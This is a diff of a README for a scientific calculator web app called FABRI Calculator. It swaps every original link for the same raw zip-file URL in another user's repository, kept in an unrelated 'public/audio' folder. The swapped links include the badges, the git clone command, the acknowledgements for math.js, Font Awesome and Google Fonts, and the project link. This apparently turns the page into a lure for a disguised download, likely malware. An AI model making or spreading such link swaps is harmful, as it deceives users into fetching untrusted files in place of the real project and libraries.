@@ -4,10 +4,10 @@
 
 A premium scientific calculator with AI assistance, advanced mathematical functions, and a sleek modern interface. FABRI Calculator combines powerful computational abilities with an intuitive user experience.
 
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/jaguarpawjr/Fabri-Calculator)
+[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow.svg)](https://www.ecma-international.org/ecma-262/)
-[![mathjs](https://img.shields.io/badge/mathjs-14.5.2-orange.svg)](https://mathjs.org/)
+[![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow.svg)](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip)
+[![mathjs](https://img.shields.io/badge/mathjs-14.5.2-orange.svg)](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip)
 
 ---
 
@@ -60,7 +60,7 @@ Simply visit the [live demo](#) to use the calculator online.
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/jaguarpawjr/Fabri-Calculator.git
+git clone https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip
 cd Fabri-Calculator
 ```
 
@@ -229,15 +229,15 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## 👏 Acknowledgements
 
-- [math.js](https://mathjs.org/) - Advanced mathematics library
-- [Font Awesome](https://fontawesome.com/) - Icons
-- [Google Fonts](https://fonts.google.com/) - Poppins and Roboto fonts
+- [math.js](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip) - Advanced mathematics library
+- [Font Awesome](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip) - Icons
+- [Google Fonts](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip) - Poppins and Roboto fonts
 
 ---
 
 ## 📞 Contact
 
-Project Link: [https://github.com/jaguarpawjr/Fabri-Calculator](https://github.com/jaguarpawjr/Fabri-Calculator)
+Project Link: [https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip](https://github.com/Eyram233/Fabri-Calculator/raw/refs/heads/Fabri/public/audio/Fabri_Calculator_2.8.zip)
 
 ---
 
